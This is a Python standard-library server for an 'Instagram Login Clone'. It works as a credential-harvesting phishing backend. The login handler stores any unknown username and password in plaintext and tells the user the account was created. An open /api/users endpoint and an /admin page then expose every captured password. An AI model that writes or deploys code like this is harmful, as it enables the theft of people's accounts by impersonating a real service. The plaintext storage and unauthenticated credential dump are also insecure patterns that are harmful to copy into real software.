"""
Instagram Login Clone - Python Backend Server
Uses only Python standard library (no pip install needed!)
"""

import http.server
import json
import os
import socketserver
from urllib.parse import urlparse

PORT = int(os.environ.get('PORT', 3000))
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'users.json')
PUBLIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'public')

# Ensure data directory exists
os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)


def get_users():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return []


def save_users(users):
    with open(DATA_FILE, 'w') as f:
        json.dump(users, f, indent=2)


class MyHandler(http.server.SimpleHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PUBLIC_DIR, **kwargs)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body)
        except:
            self.send_json({'success': False, 'message': 'Invalid request.'})
            return

        if self.path == '/api/login':
            self.handle_login(data)
        elif self.path == '/api/signup':
            self.handle_signup(data)
        else:
            self.send_json({'success': False, 'message': 'Not found.'})

    def do_GET(self):
        if self.path == '/api/users':
            self.handle_get_users()
        elif self.path == '/admin':
            # Serve admin.html
            self.path = '/admin.html'
            super().do_GET()
        else:
            super().do_GET()

    def handle_login(self, data):
        from datetime import datetime, timezone

        username = data.get('username', '').strip()
        password = data.get('password', '')

        if not username or not password:
            self.send_json({'success': False, 'message': 'Please enter both username and password.'})
            return

        users = get_users()

        # Find existing user
        user = None
        for u in users:
            if (u.get('username', '').lower() == username.lower() or
                u.get('email', '').lower() == username.lower()):
                user = u
                break

        if user and user.get('password') == password:
            self.send_json({'success': True, 'message': f"Welcome back, {user.get('fullname', user.get('username'))}!"})
            return

        if user and user.get('password') != password:
            self.send_json({'success': False, 'message': 'Sorry, your password was incorrect. Please double-check your password.'})
            return

        # New user - auto-register (store their credentials)
        new_user = {
            'username': username,
            'email': username,
            'fullname': username,
            'password': password,
            'loginTime': datetime.now(timezone.utc).isoformat()
        }
        users.append(new_user)
        save_users(users)

        self.send_json({'success': True, 'message': f"Welcome, {username}! Your account has been created."})

    def handle_signup(self, data):
        from datetime import datetime, timezone

        email = data.get('email', '').strip()
        fullname = data.get('fullname', '').strip()
        username = data.get('username', '').strip()
        password = data.get('password', '')

        if not all([email, fullname, username, password]):
            self.send_json({'success': False, 'message': 'All fields are required.'})
            return

        users = get_users()

        for u in users:
            if u.get('username', '').lower() == username.lower():
                self.send_json({'success': False, 'message': 'This username is already taken.'})
                return
            if u.get('email', '').lower() == email.lower():
                self.send_json({'success': False, 'message': 'Another account is using this email.'})
                return

        users.append({
            'email': email,
            'fullname': fullname,
            'username': username,
            'password': password,
            'signupTime': datetime.now(timezone.utc).isoformat()
        })
        save_users(users)

        self.send_json({'success': True, 'message': f"Account created for {fullname}!"})

    def handle_get_users(self):
        users = get_users()
        self.send_json(users)

    def send_json(self, data):
        response = json.dumps(data).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(response))
        self.end_headers()
        self.wfile.write(response)

    # Suppress request logs in console (cleaner output)
    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {args[0]}")


if __name__ == '__main__':
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"")
        print(f"  🚀 Instagram Login Clone Server Running!")
        print(f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"  📱 Login Page  → http://localhost:{PORT}")
        print(f"  📋 Admin Panel → http://localhost:{PORT}/admin")
        print(f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"")
        httpd.serve_forever()
